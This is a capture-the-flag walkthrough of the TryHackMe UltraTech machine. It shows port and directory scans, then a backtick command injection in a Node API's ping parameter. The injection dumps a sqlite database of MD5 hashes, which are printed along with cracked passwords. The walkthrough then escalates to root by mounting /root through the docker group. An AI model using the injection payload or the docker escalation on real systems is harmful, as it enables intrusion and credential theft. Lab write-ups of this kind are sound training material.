ULTRA TECH 


ENUMERATION 

NMAP 
"""


                                                                                                                                                                       
â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/UltraTech]
â””â”€$ sudo nmap -p- -sC -sV -A  --min-rate 2500 $IP -oN nmap.txt 
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-06 03:56 EST
Stats: 0:00:59 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.73% done; ETC: 03:57 (0:00:00 remaining)
Nmap scan report for 10.10.39.70
Host is up (0.17s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-cors: HEAD GET POST PUT DELETE PATCH
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=3/6%OT=21%CT=1%CU=38266%PV=Y%DS=2%DC=T%G=Y%TM=62247777
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=A)SEQ(
OS:SP=106%GCD=1%ISR=10D%TI=Z%II=I%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3
OS:=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=68DF%W2=6
OS:8DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW
OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   167.06 ms 10.11.0.1
2   167.28 ms 10.10.39.70

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.73 seconds


"""


API AT 8081


"""


â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/UltraTech]
â””â”€$ gobuster dir -u http://10.10.39.70:8081/ -w /usr/share/wordlists/dirb/big.txt  -t 80 --no-error               
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.39.70:8081/
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/06 03:59:36 Starting gobuster in directory enumeration mode
===============================================================
/auth                 (Status: 200) [Size: 39]
/ping                 (Status: 500) [Size: 1094]
                                                
===============================================================
2022/03/06 04:00:20 Finished
===============================================================



"""



GOBUSTER AT 31331


"""

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/UltraTech]
â””â”€$ gobuster dir -u http://10.10.39.70:31331/ -w /usr/share/wordlists/dirb/big.txt  -t 80 --no-error -x php,jsp,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.39.70:31331/
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,jsp,txt
[+] Timeout:                 10s
===============================================================
2022/03/06 04:00:43 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd.jsp        (Status: 403) [Size: 302]
/.htpasswd.txt        (Status: 403) [Size: 302]
/.htpasswd            (Status: 403) [Size: 298]
/.htpasswd.php        (Status: 403) [Size: 302]
/.htaccess            (Status: 403) [Size: 298]
/.htaccess.php        (Status: 403) [Size: 302]
/.htaccess.jsp        (Status: 403) [Size: 302]
/.htaccess.txt        (Status: 403) [Size: 302]
/css                  (Status: 301) [Size: 317] [--> http://10.10.39.70:31331/css/]
/favicon.ico          (Status: 200) [Size: 15086]                                  
/images               (Status: 301) [Size: 320] [--> http://10.10.39.70:31331/images/]
/javascript           (Status: 301) [Size: 324] [--> http://10.10.39.70:31331/javascript/]
/js                   (Status: 301) [Size: 316] [--> http://10.10.39.70:31331/js/]        
/robots.txt           (Status: 200) [Size: 53]                                            
/robots.txt           (Status: 200) [Size: 53]                                            
/server-status        (Status: 403) [Size: 302]                                           
                                                                                          
===============================================================
2022/03/06 04:03:44 Finished
===============================================================



"""

ON THE http://10.10.39.70:31331/robots.txt 

found 

"""

Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt


"""
http://10.10.39.70:31331/utech_sitemap.txt


"""

/
/index.html
/what.html
/partners.html


"""


SO LETS ENUMERATE ALL OF THEM ONE BY ONE 

"""

http://10.10.39.70:31331/partners.html

FOUND A LOGIN PAGE 

THE AUTHENTICATION PROCESS SEEAMS WEAK LETS TRY TO BYPASS IT BY SQL INJECTION 

NO LUCK 


SO WITH A HINT WE CAME TO KNOW THAT SERVER PING AFTER EVERY 10 SECONDS 

CAPTURE THE PING REQUEST FROM SERVER

http://10.10.39.70:8081/ping?ip=10.10.39.70`ls`

AFTER USING &&,||,; dilimeters we found ` to work


ping: utech.db.sqlite: Name or service not known 

http://10.10.39.70:8081/ping?ip=10.10.39.70`cat utech.db.sqlite`

'ping: ) ï¿½ï¿½ï¿½(Mr00tf357a0c52799563c7c7b76c1e7543a32)M
admin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded '


we got hash of admin  and mroot

user = r00t
hash = f357a0c52799563c7c7b76c1e7543a32

password = n100906


user = admin

hash = 0d0ea5111e3c1def594c1684e3b9be84

password = mrsheafy


"""

LOG In 
"""

Restricted area

Hey r00t, can you please have a look at the server's configuration?
The intern did it and I don't really trust him.
Thanks!

lp1

"""


LETS TRY SSH 


SSH

"""

r00t@ultratech-prod:/tmp$ docker run -v /root:/mnt -it bash
id                                                                                                                                                                     
bash-5.0# id                                                                                                                                                           
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)                                      
bash-5.0# cd /root                                                                                                                                                     
bash-5.0# ls                                                                                                                                                           
bash-5.0# ls -la                                                                                                                                                       
total 8
drwx------    2 root     root          4096 Mar  4  2019 .
drwxr-xr-x    1 root     root          4096 Mar  6 10:09 ..
bash-5.0# cd /root/.ssh/
bash: cd: /root/.ssh/: No such file or directory
bash-5.0# ls -la
total 8
drwx------    2 root     root          4096 Mar  4  2019 .
drwxr-xr-x    1 root     root          4096 Mar  6 10:09 ..
bash-5.0# pwd
/root
bash-5.0# cd ..
bash-5.0# ls
bin    dev    etc    home   lib    media  mnt    opt    proc   root   run    sbin   srv    sys    tmp    usr    var
bash-5.0# ls
bin    dev    etc    home   lib    media  mnt    opt    proc   root   run    sbin   srv    sys    tmp    usr    var
bash-5.0# cd root
bash-5.0# ls
bash-5.0# cd ..
bash-5.0# ls
bin    dev    etc    home   lib    media  mnt    opt    proc   root   run    sbin   srv    sys    tmp    usr    var
bash-5.0# cd home
bash-5.0# ls
bash-5.0# ls -la
total 8
drwxr-xr-x    2 root     root          4096 Mar  4  2019 .
drwxr-xr-x    1 root     root          4096 Mar  6 10:09 ..
bash-5.0# cd root
bash: cd: root: No such file or directory
bash-5.0# ls
bash-5.0# cd ..
bash-5.0# 



"""


